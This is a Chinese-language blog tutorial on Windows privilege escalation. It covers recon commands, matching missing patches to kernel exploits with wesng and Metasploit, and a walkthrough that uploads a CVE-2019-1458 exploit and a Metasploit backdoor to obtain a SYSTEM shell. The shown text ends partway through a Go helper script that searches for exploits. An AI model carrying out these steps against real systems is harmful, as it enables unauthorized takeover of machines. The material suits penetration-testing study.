

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="fuming">
  <meta name="keywords" content="">
  
    <meta name="description" content="windows 提权 信息收集 当前权限 -&gt; 提权方法 操作系统版本&#x2F;位数 -&gt; 提权方法 漏洞补丁 -&gt; 溢出漏洞 杀软防护 -&gt; 当前进程服务，免杀 网络情况 -&gt; 无法反弹shell?     命令 描述    systeminfo 打印系统信息   whoami 获得当前用户名   whoami &#x2F;priv 当前帐户权限   hostna">
<meta property="og:type" content="article">
<meta property="og:title" content="windows 提权">
<meta property="og:url" content="https://fuyoumingyan.github.io/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
<meta property="og:site_name" content="fuyoumingyan&#39;s blog">
<meta property="og:description" content="windows 提权 信息收集 当前权限 -&gt; 提权方法 操作系统版本&#x2F;位数 -&gt; 提权方法 漏洞补丁 -&gt; 溢出漏洞 杀软防护 -&gt; 当前进程服务，免杀 网络情况 -&gt; 无法反弹shell?     命令 描述    systeminfo 打印系统信息   whoami 获得当前用户名   whoami &#x2F;priv 当前帐户权限   hostna">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/windows.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203104753071.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105042332.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105123167.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105225998.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105208984.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105728324.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105917225.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206120338007.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206131819833.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206131542046.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208103110277.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208094012192.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208102053587.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208102018939.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104656413.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104812952.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208104825955.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208113756969.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230208115110564.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214212026690.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212193308387.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212215054023.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212200939237.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212201031688.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212193944834.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212194138937.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212214811475.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230212214847628.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213232945032.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233019826.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233040579.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233509662.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213233706067.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213234055666.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213213007743.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213220818574.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213224207793.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213121142976.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213211052896-16762938548401.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213211526717.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230213212351569.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214220937763.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222451668.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222748510.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214222938995.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230214223402301.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201206945.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201237872.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131173915674.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202324155.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201842453.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202558414.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202632942.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202806186.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202829764.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201171614280.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131222319329.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131222059289.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201172820986.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201173044181.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201173241862.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201174014723.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201174305333.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201182018938.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201190453256.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201190544182.png">
<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201191002084.png">
<meta property="article:published_time" content="2023-07-22T10:25:00.000Z">
<meta property="article:modified_time" content="2023-07-22T11:03:23.009Z">
<meta property="article:author" content="fuming">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/windows.png">
  
  
  
  <title>windows 提权 - fuyoumingyan&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"fuyoumingyan.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>fuyoumingyan&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="windows 提权"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-07-22 18:25" pubdate>
          2023年7月22日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          95 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">windows 提权</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/windows.png" srcset="/img/loading.gif" lazyload alt="windows"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
<li>当前权限 -&gt; 提权方法</li>
<li>操作系统版本&#x2F;位数 -&gt; 提权方法</li>
<li>漏洞补丁 -&gt; 溢出漏洞</li>
<li>杀软防护 -&gt; 当前进程服务，免杀</li>
<li>网络情况 -&gt; 无法反弹shell?</li>
</ol>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>systeminfo</td>
<td>打印系统信息</td>
</tr>
<tr>
<td>whoami</td>
<td>获得当前用户名</td>
</tr>
<tr>
<td>whoami &#x2F;priv</td>
<td>当前帐户权限</td>
</tr>
<tr>
<td>hostname</td>
<td>主机名</td>
</tr>
<tr>
<td>net user</td>
<td>列出用户</td>
</tr>
<tr>
<td>net user UserName</td>
<td>关于用户的信息</td>
</tr>
<tr>
<td>netsh firewall show config</td>
<td>显示防火墙配置</td>
</tr>
<tr>
<td>tasklist</td>
<td>列出进程</td>
</tr>
<tr>
<td>tasklist &#x2F;svc</td>
<td>列出服务任务</td>
</tr>
<tr>
<td>net start</td>
<td>列出启动的服务</td>
</tr>
<tr>
<td>sc query</td>
<td>列出所有服务</td>
</tr>
</tbody></table>
<h2 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h2><h3 id="1-利用"><a href="#1-利用" class="headerlink" title="1.利用"></a>1.利用</h3><p>使用范围：windows全版本，主要根据补丁情况决定</p>
<p>使用权限：web服务器权限即可</p>
<p>利用流程：</p>
<ol>
<li>信息收集</li>
<li>筛选EXP</li>
<li>下载EXP</li>
<li>上传EXP</li>
<li>EXP利用</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md">https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md</a></p>
<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><p><code>systeminfo</code></p>
<p>根据系统版本、补丁信息，筛选可用EXP。</p>
<h4 id="2-筛选EXP"><a href="#2-筛选EXP" class="headerlink" title="2.筛选EXP"></a>2.筛选EXP</h4><p>筛选EXP -&gt; 根据系统类型、补丁情况寻找未打补丁的漏洞 </p>
<p>在线网站：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.adminxe.com/CompareSys/">https://www.adminxe.com/CompareSys/</a></li>
</ol>
<p>辅助工具：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester">https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></li>
<li>MSF</li>
</ol>
<blockquote>
<p>wesng：复制systeminfo保持为txt，在本地执行wes.py</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> -o cve.csv<br></code></pre></td></tr></table></figure>

<blockquote>
<p>MSF</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">run post/windows/gather/enum_patches					# 查看系统补丁情况<br>run post/multi/recon/local_exploit_suggester			# 自动筛选可用EXP<br></code></pre></td></tr></table></figure>

<h4 id="3-下载EXP"><a href="#3-下载EXP" class="headerlink" title="3.下载EXP"></a>3.下载EXP</h4><p>EXP可能有很多都无法成功，原因很多，所以一定要看一些EXP的介绍，了解一下漏洞成因(比如是根据某服务进行提权,但是目标根本就没有,所以自然无法提权成功),使用方式(直接提权&#x2F;可以提权执行命令)….</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
<li>MSF</li>
</ol>
<h4 id="4-上传并执行EXP"><a href="#4-上传并执行EXP" class="headerlink" title="4.上传并执行EXP"></a>4.上传并执行EXP</h4><p>上传 -&gt; webshell,msf upload…</p>
<h4 id="5-流程"><a href="#5-流程" class="headerlink" title="5.流程"></a>5.流程</h4><blockquote>
<p>手工提权</p>
</blockquote>
<p>webshell -&gt; systeminfo -&gt; wesng -&gt; 网上寻找EXP -&gt; 上传EXP -&gt; EXP利用 -&gt; systeminfo</p>
<blockquote>
<p>MSF提权</p>
</blockquote>
<p>webshell -&gt; 上传msf后门 -&gt; msf监听 -&gt; 执行后门 -&gt; post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester(自动筛选exp) -&gt; bg -&gt; info … -&gt;  use …(使用…模块) -&gt; show options -&gt; set session … … -&gt; run -&gt; systeminfo</p>
<h3 id="2-实操"><a href="#2-实操" class="headerlink" title="2.实操"></a>2.实操</h3><h4 id="1-MSF"><a href="#1-MSF" class="headerlink" title="1.MSF"></a>1.MSF</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sysinfo</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203104753071.png" srcset="/img/loading.gif" lazyload alt="image-20230203104753071"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/multi/recon/local_exploit_suggester	<span class="hljs-comment"># 自动筛选EXP</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105042332.png" srcset="/img/loading.gif" lazyload alt="image-20230203105042332"></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> <span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/cve_2019_1458_wizardopium<br><span class="hljs-keyword">show</span> options<br>set session <span class="hljs-number">1</span><br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105123167.png" srcset="/img/loading.gif" lazyload alt="image-20230203105123167"></p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230203105225998.png" srcset="/img/loading.gif" lazyload alt="image-20230203105225998"></p>
<h4 id="2-手工"><a href="#2-手工" class="headerlink" title="2.手工"></a>2.手工</h4><p>使用MSF进行EXP枚举动静较大，且一些新的漏洞exp msf中可能未集成，所以这里熟悉一下手工提权的流程。</p>
<p>信息收集 -&gt; 筛选EXP -&gt; 下载EXP -&gt; 上传并执行EXP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo			<span class="hljs-comment"># 查看系统版本/位数/补丁情况</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105208984.png" srcset="/img/loading.gif" lazyload alt="image-20230206105208984"></p>
<p>复制<code>systeminfo</code>信息，并使用<code>wesng</code>筛选未打补丁的漏洞编号。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> -o cve.csv<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105728324.png" srcset="/img/loading.gif" lazyload alt="image-20230206105728324"></p>
<p>查找存在的EXP的漏洞，这个是因为github上的比较慢，还要一个一个搜，就把 Kernelhub、PoC-in-GitHub、WindowsVulnScan 全部克隆下来到本地，然后写了个脚本解析csv文件，提取权限提升的漏洞编号，批量使用find命令进行查找exp路径。exp的项目可以使用<code>crontab</code>命令定时进行克隆。</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206105917225.png" srcset="/img/loading.gif" lazyload alt="image-20230206105917225"></p>
<p>然后就是看每个EXP的介绍，寻找适合的EXP，这里使用 CVE-2019-1458。</p>
<p>使用MSF上传EXP：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>wesng<span class="hljs-regexp">/exp/</span>CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">1458</span><span class="hljs-regexp">/cve-2019-1458.exe C:/</span>Users<span class="hljs-regexp">/Administrator/</span>Desktop<br></code></pre></td></tr></table></figure>

<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206120338007.png" srcset="/img/loading.gif" lazyload alt="image-20230206120338007"></p>
<p>这个exp可以以system权限执行命令，不能直接反弹shell，这里使用exp执行msf的后门，然后再启动一个msf进行监听：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206131819833.png" srcset="/img/loading.gif" lazyload alt="image-20230206131819833"></p>
<p>得到一个system权限的shell：</p>
<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230206131542046.png" srcset="/img/loading.gif" lazyload alt="image-20230206131542046"></p>
<p>get_windows_exp.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;encoding/csv&quot;</span><br>	<span class="hljs-string">&quot;fmt&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>	<span class="hljs-string">&quot;os/exec&quot;</span><br>	<span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Cmd</span><span class="hljs-params">(name <span class="hljs-type">string</span>, args ...<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>	cmd := exec.Command(name, args...)<br>	out, err := cmd.CombinedOutput()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(<span class="hljs-string">&quot;命令执行模块发生错误&quot;</span>, err)<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Deduplication</span><span class="hljs-params">(lines []<span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">string</span> &#123;<br>	m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br>	<span class="hljs-keyword">var</span> result []<span class="hljs-type">string</span><br>	<span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> lines &#123;<br>		<span class="hljs-keyword">if</span> !m[line] &#123;<br>			result = <span class="hljs-built_in">append</span>(result, line)<br>			m[line] = <span class="hljs-literal">true</span><br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> result<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadCsv</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">string</span> &#123;<br>	file, err := os.Open(path)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(<span class="hljs-string">&quot;文件文件打开错误:&quot;</span>, err)<br>	&#125;<br>	<span class="hljs-keyword">defer</span> file.Close()<br>	reader := csv.NewReader(file)<br>	all, err := reader.ReadAll()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(<span class="hljs-string">&quot;CSV读取发生错误:&quot;</span>, err)<br>	&#125;<br>	<span class="hljs-keyword">var</span> subdomains []<span class="hljs-type">string</span><br>	<span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(all); i++ &#123;<br>		<span 